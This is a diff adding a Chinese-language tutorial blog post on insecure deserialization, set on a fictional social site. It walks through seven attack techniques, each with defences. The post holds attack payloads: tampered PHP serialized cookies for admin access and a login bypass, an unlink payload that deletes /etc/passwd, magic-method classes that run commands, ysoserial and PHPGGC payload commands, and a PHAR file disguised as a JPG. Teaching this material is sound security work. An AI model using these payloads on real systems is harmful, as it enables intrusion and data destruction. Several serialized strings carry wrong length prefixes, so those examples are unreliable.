@@ -126,6 +126,741 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="Insecure Deserialization-InsecureDeserialization" class="article article-type-Insecure Deserialization" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/05/07/InsecureDeserialization/" class="article-date">
+  	<time datetime="2025-05-06T17:20:49.127Z" itemprop="datePublished">2025-05-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/05/07/InsecureDeserialization/">
+        Insecure Deserialization
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Insecure-Deserialization：從入門到進階，涵蓋所有攻擊手法"><a href="#Insecure-Deserialization：從入門到進階，涵蓋所有攻擊手法" class="headerlink" title="Insecure Deserialization：從入門到進階，涵蓋所有攻擊手法"></a>Insecure Deserialization：從入門到進階，涵蓋所有攻擊手法</h1><h2 id="簡介-Introduction"><a href="#簡介-Introduction" class="headerlink" title="簡介 &#x2F; Introduction"></a>簡介 &#x2F; Introduction</h2><p><strong>Insecure Deserialization</strong>（不安全的反序列化）是一種嚴重的安全漏洞，當網站將用戶可控制的資料進行 <strong>deserialization</strong>（反序列化）時，攻擊者可能操縱 <strong>serialized objects</strong>（序列化物件），將惡意資料注入應用程式程式碼，進而執行高危攻擊，如 <strong>remote code execution</strong>（遠程程式碼執行）、<strong>privilege escalation</strong>（權限提升）或 <strong>data breaches</strong>（資料外洩）。這種漏洞的危險性在於它暴露了應用程式的廣大 <strong>attack surface</strong>（攻擊面），允許攻擊者利用現有程式碼執行惡意操作。</p>
+<p><strong>白話解釋</strong>：<br>想像 <strong>serialization</strong>（序列化）是把一個物件（像一本書）壓縮成一串代碼（像一本書的數位檔案），方便儲存或傳輸。<strong>Deserialization</strong> 是把這串代碼還原成物件。但如果壞人偷偷改了代碼（<strong>serialized data</strong>），還原後的物件可能變成一個「病毒」，危害網站。這就是 <strong>Insecure Deserialization</strong>。</p>
+<hr>
+<h2 id="Serialization-與-Deserialization-的基礎-Basics-of-Serialization-and-Deserialization"><a href="#Serialization-與-Deserialization-的基礎-Basics-of-Serialization-and-Deserialization" class="headerlink" title="Serialization 與 Deserialization 的基礎 &#x2F; Basics of Serialization and Deserialization"></a>Serialization 與 Deserialization 的基礎 &#x2F; Basics of Serialization and Deserialization</h2><h3 id="什麼是-Serialization？-What-is-Serialization"><a href="#什麼是-Serialization？-What-is-Serialization" class="headerlink" title="什麼是 Serialization？ &#x2F; What is Serialization?"></a>什麼是 Serialization？ &#x2F; What is Serialization?</h3><p><strong>Serialization</strong>（序列化）是將複雜的資料結構（如 <strong>objects</strong>，物件及其屬性）轉換為一串連續的 <strong>byte stream</strong>（位元組流）的過程，以便：</p>
+<ul>
+<li>儲存到檔案、<strong>database</strong>（資料庫）或 <strong>inter-process memory</strong>（進程間記憶體）。</li>
+<li>透過網路傳輸，例如在 <strong>API calls</strong>（API 呼叫）或應用程式組件之間。</li>
+</ul>
+<p><strong>Serialization</strong> 會保留物件的 <strong>state</strong>（狀態），包括其 <strong>attributes</strong>（屬性）及其值（包括 <strong>private fields</strong>，私有欄位）。</p>
+<p><strong>白話解釋</strong>：<br><strong>Serialization</strong> 就像把一本書（<strong>object</strong>）的所有內容（<strong>attributes</strong>）壓縮成一串數位代碼（<strong>byte stream</strong>），方便存到硬碟或寄給別人。這串代碼不僅包含書的內容，還記錄書的狀態（比如書籤在哪頁）。</p>
+<h3 id="什麼是-Deserialization？-What-is-Deserialization"><a href="#什麼是-Deserialization？-What-is-Deserialization" class="headerlink" title="什麼是 Deserialization？ &#x2F; What is Deserialization?"></a>什麼是 Deserialization？ &#x2F; What is Deserialization?</h3><p><strong>Deserialization</strong>（反序列化）是將 <strong>byte stream</strong> 還原為原始 <strong>object</strong> 的過程，還原後的物件與序列化時的狀態完全相同，應用程式可以直接與其互動。</p>
+<p><strong>白話解釋</strong>：<br><strong>Deserialization</strong> 就像把數位代碼（<strong>byte stream</strong>）重新打開，變回一本完整的書（<strong>object</strong>），而且書籤還在原來的位置，網站可以像用普通物件一樣使用它。</p>
+<h3 id="Serialization-的格式-Serialization-Formats"><a href="#Serialization-的格式-Serialization-Formats" class="headerlink" title="Serialization 的格式 &#x2F; Serialization Formats"></a>Serialization 的格式 &#x2F; Serialization Formats</h3><p>不同程式語言使用不同的 <strong>serialization formats</strong>（序列化格式）：</p>
+<ul>
+<li><strong>String-based formats</strong>（基於字串的格式）：如 <strong>PHP</strong>，生成人類可讀的字串。</li>
+<li><strong>Binary formats</strong>（二進位格式）：如 <strong>Java</strong>，生成難以閱讀的位元組序列。</li>
+<li><strong>其他術語</strong>：<ul>
+<li><strong>Ruby</strong> 稱為 <strong>marshalling</strong>（封裝）。</li>
+<li><strong>Python</strong> 稱為 <strong>pickling</strong>（醃製）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>白話解釋</strong>：<br><strong>Serialization</strong> 的結果就像書的數位檔案格式。<strong>PHP</strong> 的檔案像一本清楚的筆記，容易讀；<strong>Java</strong> 的檔案像一堆亂碼，只有電腦懂。不同語言有不同名字，但意思一樣。</p>
+<h3 id="Insecure-Deserialization-的定義-What-is-Insecure-Deserialization"><a href="#Insecure-Deserialization-的定義-What-is-Insecure-Deserialization" class="headerlink" title="Insecure Deserialization 的定義 &#x2F; What is Insecure Deserialization?"></a>Insecure Deserialization 的定義 &#x2F; What is Insecure Deserialization?</h3><p><strong>Insecure Deserialization</strong> 是指網站將用戶可控制的 <strong>serialized data</strong>（序列化資料）進行 <strong>deserialization</strong>，允許攻擊者操縱 <strong>serialized objects</strong>，注入惡意資料或物件，觸發危險行為。這有時被稱為 <strong>object injection</strong>（物件注入），因為攻擊者可注入任意 <strong>class</strong>（類別）的物件。</p>
+<p><strong>原理</strong>：  </p>
+<ul>
+<li><strong>Deserialization</strong> 不檢查物件的 <strong>class</strong>，只要網站支援該 <strong>class</strong>，就會還原並執行。</li>
+<li>攻擊可能在 <strong>deserialization</strong> 過程中觸發（如通過 <strong>magic methods</strong>，魔法方法），無需應用程式直接使用物件。</li>
+</ul>
+<p><strong>白話解釋</strong>：<br>這就像網站把一串來路不明的代碼（<strong>serialized data</strong>）直接還原成書，但壞人偷偷把代碼改成一本「病毒書」，還原後可能自動執行危險動作（像刪除檔案）。</p>
+<hr>
+<h2 id="統一情境：ConnectSphere-社交媒體網站-Unified-Scenario-ConnectSphere-Social-Media-Website"><a href="#統一情境：ConnectSphere-社交媒體網站-Unified-Scenario-ConnectSphere-Social-Media-Website" class="headerlink" title="統一情境：ConnectSphere 社交媒體網站 &#x2F; Unified Scenario: ConnectSphere Social Media Website"></a>統一情境：ConnectSphere 社交媒體網站 &#x2F; Unified Scenario: ConnectSphere Social Media Website</h2><p>我們設定一個情境：ConnectSphere 是一家社交媒體網站，允許用戶發帖、聊天和管理個人資料。網站使用 <strong>PHP</strong>、<strong>Java</strong> 和 <strong>Ruby</strong> 技術，並儲存用戶 <strong>session data</strong>（會話資料）和其他資料結構作為 <strong>serialized objects</strong>。功能包括：</p>
+<ul>
+<li><strong>User Profile</strong>（用戶檔案）：儲存用戶資訊（如用戶名、電子郵件）。</li>
+<li><strong>Session Management</strong>（會話管理）：使用 <strong>cookies</strong> 儲存序列化的 <strong>User</strong> 物件。</li>
+<li><strong>File Upload</strong>（檔案上傳）：允許上傳頭像（支援 <strong>JPG</strong> 和 <strong>PNG</strong>）。</li>
+<li><strong>APIs</strong>：提供動態功能，如 <code>/api/delete_user</code> 刪除用戶帳戶。</li>
+</ul>
+<p><strong>漏洞</strong>：</p>
+<ul>
+<li><strong>Cookies</strong> 包含未驗證的 <strong>serialized objects</strong>。</li>
+<li>檔案上傳功能未嚴格檢查檔案格式，允許 <strong>PHAR</strong>（PHP 檔案）偽裝成圖片。</li>
+<li><strong>Deserialization</strong> 過程未檢查輸入資料的完整性。</li>
+<li>網站使用多個第三方 <strong>libraries</strong>（如 <strong>Apache Commons Collections</strong>），包含已知的 <strong>gadget chains</strong>（小工具鏈）。</li>
+</ul>
+<p>以下將以 ConnectSphere 為例，展示所有 <strong>Insecure Deserialization</strong> 攻擊手法。</p>
+<hr>
+<h2 id="Insecure-Deserialization-的攻擊手法-Attack-Techniques-for-Insecure-Deserialization"><a href="#Insecure-Deserialization-的攻擊手法-Attack-Techniques-for-Insecure-Deserialization" class="headerlink" title="Insecure Deserialization 的攻擊手法 &#x2F; Attack Techniques for Insecure Deserialization"></a>Insecure Deserialization 的攻擊手法 &#x2F; Attack Techniques for Insecure Deserialization</h2><p><strong>Insecure Deserialization</strong> 攻擊利用用戶可控制的 <strong>serialized data</strong>，操縱物件屬性、注入任意物件或利用 <strong>gadget chains</strong> 執行惡意操作。以下詳細介紹所有攻擊手法，每種包含定義、原理、ConnectSphere 情境中的具體攻擊方法、範例和防禦策略。</p>
+<h3 id="攻擊手法-1：Modifying-Serialized-Object-Attributes（修改序列化物件屬性）"><a href="#攻擊手法-1：Modifying-Serialized-Object-Attributes（修改序列化物件屬性）" class="headerlink" title="攻擊手法 1：Modifying Serialized Object Attributes（修改序列化物件屬性）"></a>攻擊手法 1：Modifying Serialized Object Attributes（修改序列化物件屬性）</h3><p><strong>定義</strong>：<br>攻擊者修改 <strong>serialized object</strong> 的 <strong>attributes</strong>（屬性），改變物件狀態，誘導應用程式執行未授權操作，如 <strong>privilege escalation</strong>。</p>
+<p><strong>原理</strong>：<br><strong>Serialization</strong> 保留物件的 <strong>state</strong>，包括 <strong>private fields</strong>。攻擊者可直接編輯 <strong>serialized data</strong>，改變屬性值，繞過應用程式的邏輯檢查。</p>
+<p><strong>ConnectSphere 攻擊方法</strong>：<br>攻擊者修改 <strong>cookie</strong> 中的 <strong>serialized User object</strong>，提升權限。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>基本權限提升</strong>：<br><strong>Cookie</strong> 包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:7:&quot;isAdmin&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>
+<p>攻擊者修改為：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:7:&quot;isAdmin&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站執行：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;session&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;isAdmin) &#123;</span><br><span class="line">    <span class="comment">// 允許訪問管理員介面</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>攻擊者獲得管理員權限。</li>
+</ul>
+</li>
+<li><p><strong>改變用戶ID</strong>：<br>攻擊者修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:4:&quot;userId&quot;;i:123;&#125;</span><br></pre></td></tr></table></figure>
+<p>為：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:4:&quot;userId&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站將攻擊者視為用戶 ID 1（可能為管理員）。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像改一本書的內容，把「普通讀者」改成「圖書館長」，網站還原這本書後，誤以為你是管理員，讓你進管理室。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>對 <strong>serialized data</strong> 實施 <strong>digital signature</strong>（數位簽章），驗證完整性。</li>
+<li>避免將 <strong>serialized objects</strong> 儲存在用戶可控制的 <strong>cookies</strong>。</li>
+<li>使用 <strong>session management</strong> 框架（如 <strong>PHP sessions</strong>）。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-2：Modifying-Serialized-Data-Types（修改序列化資料類型）"><a href="#攻擊手法-2：Modifying-Serialized-Data-Types（修改序列化資料類型）" class="headerlink" title="攻擊手法 2：Modifying Serialized Data Types（修改序列化資料類型）"></a>攻擊手法 2：Modifying Serialized Data Types（修改序列化資料類型）</h3><p><strong>定義</strong>：<br>攻擊者改變 <strong>serialized object</strong> 的 <strong>data types</strong>（資料類型），利用應用程式的邏輯漏洞（如 <strong>loose comparison</strong>，寬鬆比較）繞過檢查。</p>
+<p><strong>原理</strong>：<br>某些語言（如 <strong>PHP</strong>）在比較不同 <strong>data types</strong> 時行為不一致。例如，<strong>PHP</strong> 的 <code>==</code>（寬鬆比較）可能將字串轉為整數，導致邏輯錯誤。</p>
+<p><strong>ConnectSphere 攻擊方法</strong>：<br>攻擊者修改 <strong>cookie</strong> 中的 <strong>serialized object</strong>，改變密碼屬性的 <strong>data type</strong>，繞過認證。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>密碼繞過</strong>：<br><strong>Cookie</strong> 包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:8:&quot;password&quot;;s:10:&quot;secret1234&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>攻擊者修改為：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:8:&quot;password&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站執行：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;session&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;password == <span class="variable">$storedPassword</span>) &#123;</span><br><span class="line">    <span class="comment">// 登入成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><strong>PHP 7.x</strong> 將字串 <code>&quot;secret1234&quot;</code> 視為整數 <code>0</code>，比較結果為 <code>true</code>，繞過認證。</li>
+</ul>
+</li>
+<li><p><strong>數字開頭字串</strong>：<br>攻擊者修改為：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:8:&quot;password&quot;;s:10:&quot;5something&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>比較 <code>5 == &quot;5something&quot;</code> 為 <code>true</code>，繞過檢查。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像把書裡的密碼改成一個數字（<code>0</code>），網站檢查時把正確密碼（字串）當成數字比較，結果誤以為一樣，讓你進門。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>使用 <strong>strict comparison</strong>（嚴格比較，<code>===</code>）檢查 <strong>data types</strong>。</li>
+<li>驗證 <strong>serialized data</strong> 的格式和類型。</li>
+<li>升級到 <strong>PHP 8</strong>，減少寬鬆比較的漏洞。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-3：Using-Application-Functionality（利用應用程式功能）"><a href="#攻擊手法-3：Using-Application-Functionality（利用應用程式功能）" class="headerlink" title="攻擊手法 3：Using Application Functionality（利用應用程式功能）"></a>攻擊手法 3：Using Application Functionality（利用應用程式功能）</h3><p><strong>定義</strong>：<br>攻擊者利用應用程式的危險功能（如檔案刪除），通過修改 <strong>serialized object</strong> 的屬性，將惡意資料傳入功能，執行破壞性操作。</p>
+<p><strong>原理</strong>：<br>應用程式可能對 <strong>deserialized object</strong> 的屬性執行操作（如刪除檔案）。攻擊者可操縱屬性，觸發未預期的行為。</p>
+<p><strong>ConnectSphere 攻擊方法</strong>：<br>攻擊者修改 <strong>cookie</strong> 中的 <strong>serialized object</strong>，誘導網站刪除任意檔案。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>檔案刪除</strong>：<br><strong>Cookie</strong> 包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:13:&quot;image_location&quot;;s:20:&quot;/uploads/carlos.jpg&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>攻擊者修改為：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:13:&quot;image_location&quot;;s:18:&quot;/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站執行：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;session&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;delete_account&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$user</span>-&gt;image_location);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>刪除 <code>/etc/passwd</code> 檔案。</li>
+</ul>
+</li>
+<li><p><strong>資料庫操作</strong>：<br>攻擊者修改屬性為 SQL 語句，誘導網站執行危險查詢。</p>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像改書裡的「頭像路徑」為重要檔案的路徑，網站以為刪除頭像，結果刪了系統檔案。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>對 <strong>deserialized object</strong> 的屬性進行 <strong>sanitization</strong>（清理）和 <strong>validation</strong>（驗證）。</li>
+<li>限制危險功能（如 <code>unlink</code>）的訪問範圍。</li>
+<li>使用 <strong>least privilege</strong>（最小權限）原則。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-4：Injecting-Arbitrary-Objects（注入任意物件）"><a href="#攻擊手法-4：Injecting-Arbitrary-Objects（注入任意物件）" class="headerlink" title="攻擊手法 4：Injecting Arbitrary Objects（注入任意物件）"></a>攻擊手法 4：Injecting Arbitrary Objects（注入任意物件）</h3><p><strong>定義</strong>：<br>攻擊者注入不同 <strong>class</strong> 的 <strong>serialized object</strong>，利用網站支援的任意 <strong>class</strong> 執行惡意操作。</p>
+<p><strong>原理</strong>：<br><strong>Deserialization</strong> 不檢查物件的 <strong>class</strong>，只要網站的 <strong>classpath</strong>（類路徑）包含該 <strong>class</strong>，就會還原。攻擊者可選擇包含危險 <strong>magic methods</strong>（魔法方法）的 <strong>class</strong>。</p>
+<p><strong>ConnectSphere 攻擊方法</strong>：<br>攻擊者注入一個包含危險 <strong>magic method</strong> 的 <strong>serialized object</strong>，觸發惡意行為。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>PHP __wakeup 攻擊</strong>：<br>網站支援一個 <strong>Logger</strong> 類別：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logFile, <span class="string">&quot;Hacked!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>攻擊者構造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Logger&quot;:1:&#123;s:7:&quot;logFile&quot;;s:18:&quot;/var/www/hacked.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Deserialization</strong> 觸發 <code>__wakeup</code>，寫入檔案 <code>hacked.txt</code>。</li>
+</ul>
+</li>
+<li><p><strong>Java readObject 攻擊</strong>：<br>攻擊者注入一個 <strong>CustomObject</strong>：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CustomObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String command;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>攻擊者構造包含 <code>command=&quot;whoami&quot;</code> 的 <strong>serialized object</strong>，觸發命令執行。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像把一本書換成另一本有「自動炸彈」的書（危險 <strong>class</strong>），網站還原時，炸彈（<strong>magic method</strong>）自動引爆。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>限制 <strong>deserialization</strong> 可用的 <strong>classes</strong>（如使用白名單）。</li>
+<li>檢查 <strong>magic methods</strong> 的安全性。</li>
+<li>避免 <strong>deserialization</strong> 用戶輸入。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-5：Exploiting-Gadget-Chains（利用小工具鏈）"><a href="#攻擊手法-5：Exploiting-Gadget-Chains（利用小工具鏈）" class="headerlink" title="攻擊手法 5：Exploiting Gadget Chains（利用小工具鏈）"></a>攻擊手法 5：Exploiting Gadget Chains（利用小工具鏈）</h3><p><strong>定義</strong>：<br>攻擊者利用網站程式碼中的 <strong>gadget chains</strong>（小工具鏈），通過一系列方法調用將惡意資料傳遞到危險的 <strong>sink gadget</strong>（接收小工具），執行高危操作。</p>
+<p><strong>原理</strong>：<br><strong>Gadget</strong> 是應用程式中的程式碼片段，攻擊者通過 <strong>magic methods</strong>（如 <code>__wakeup</code>）啟動 <strong>gadget chain</strong>，將資料傳遞到危險方法（如 <code>exec</code>）。</p>
+<p><strong>ConnectSphere 攻擊方法</strong>：<br>攻擊者使用 <strong>ysoserial</strong> 或 <strong>PHPGGC</strong> 構造 <strong>gadget chain</strong>，執行 <strong>remote code execution</strong>。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>Java Apache Commons Collections</strong>：<br>攻擊者使用 <strong>ysoserial</strong> 生成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections1 &quot;whoami&quot; &gt; payload.bin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站 <strong>deserialization</strong> 觸發 <strong>gadget chain</strong>，執行 <code>whoami</code> 命令。</li>
+</ul>
+</li>
+<li><p><strong>PHPGGC 攻擊</strong>：<br>攻擊者使用 <strong>PHPGGC</strong> 生成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc Monolog/RCE1 system whoami &gt; payload.txt</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站還原 <strong>Monolog</strong> 物件，執行命令。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像利用書裡的一連串指令（<strong>gadget chain</strong>），讓網站一步步執行壞人的命令，最後打開一個危險的「炸彈」（<strong>sink gadget</strong>）。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>避免 <strong>deserialization</strong> 用戶輸入。</li>
+<li>移除不必要的 <strong>libraries</strong>，減少 <strong>gadget chains</strong>。</li>
+<li>使用 <strong>application sandboxing</strong>（應用程式沙箱）限制執行環境。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-6：PHAR-Deserialization（利用-PHAR-反序列化）"><a href="#攻擊手法-6：PHAR-Deserialization（利用-PHAR-反序列化）" class="headerlink" title="攻擊手法 6：PHAR Deserialization（利用 PHAR 反序列化）"></a>攻擊手法 6：PHAR Deserialization（利用 PHAR 反序列化）</h3><p><strong>定義</strong>：<br>攻擊者在 <strong>PHP</strong> 中利用 <strong>PHAR</strong>（PHP 檔案）檔案的 <strong>metadata</strong>（元資料）進行 <strong>deserialization</strong>，繞過顯式的 <strong>unserialize</strong> 調用。</p>
+<p><strong>原理</strong>：<br><strong>PHAR</strong> 檔案的 <strong>metadata</strong> 是 <strong>serialized data</strong>，當使用 <strong>phar:&#x2F;&#x2F;</strong> 流處理器（如 <code>file_exists</code>）時，會自動 <strong>deserialization</strong>，觸發 <strong>magic methods</strong>。</p>
+<p><strong>ConnectSphere 攻擊方法</strong>：<br>攻擊者上傳偽裝為 <strong>JPG</strong> 的 <strong>PHAR</strong> 檔案，誘導網站處理 <strong>phar:&#x2F;&#x2F;</strong> 流。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><strong>PHAR 攻擊</strong>：<br>攻擊者創建 <strong>PHAR</strong> 檔案：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>();</span><br><span class="line"><span class="variable">$object</span>-&gt;logFile = <span class="string">&#x27;/var/www/hacked.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;dummy.txt&#x27;</span>, <span class="string">&#x27;dummy&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+<ul>
+<li>偽裝為 <strong>JPG</strong> 上傳。</li>
+<li>網站執行：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;phar://uploads/exploit.jpg&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 處理檔案</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>觸發 <code>__wakeup</code>，寫入 <code>hacked.txt</code>。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像把一本病毒書偽裝成普通圖片，網站檢查圖片時不小心打開病毒書，引發攻擊。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>禁止 <strong>phar:&#x2F;&#x2F;</strong> 流處理器。</li>
+<li>嚴格檢查上傳檔案的 <strong>MIME type</strong>（媒體類型）和內容。</li>
+<li>限制檔案系統操作的權限。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-7：Exploiting-Memory-Corruption（利用記憶體破壞）"><a href="#攻擊手法-7：Exploiting-Memory-Corruption（利用記憶體破壞）" class="headerlink" title="攻擊手法 7：Exploiting Memory Corruption（利用記憶體破壞）"></a>攻擊手法 7：Exploiting Memory Corruption（利用記憶體破壞）</h3><p><strong>定義</strong>：<br>攻擊者利用 <strong>deserialization</strong> 過程中的 <strong>memory corruption</strong>（記憶體破壞）漏洞，執行 <strong>remote code execution</strong>。</p>
+<p><strong>原理</strong>：<br><strong>Deserialization</strong> 方法（如 <strong>PHP unserialize</strong>）未針對 <strong>memory corruption</strong> 進行強化，攻擊者可利用公開的漏洞（如緩衝區溢位）觸發攻擊。</p>
+<p><strong>ConnectSphere 攻擊方法</strong>：<br>攻擊者利用已知的 <strong>PHP</strong> 漏洞，構造惡意 <strong>serialized data</strong>。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><strong>公開漏洞</strong>：<br>攻擊者利用 <strong>PHP 7.2</strong> 的 <strong>unserialize</strong> 漏洞，構造：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Evil&quot;:1:&#123;s:4:&quot;data&quot;;s:1024:&quot;[惡意資料]&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>觸發緩衝區溢位，執行任意程式碼。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像在書的代碼裡藏一個程式錯誤，網站還原時，電腦記憶體亂掉，壞人就能控制電腦。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>升級到最新版本的程式語言。</li>
+<li>避免 <strong>deserialization</strong> 用戶輸入。</li>
+<li>使用 <strong>memory-safe</strong> 語言或框架。</li>
+</ul>
+<hr>
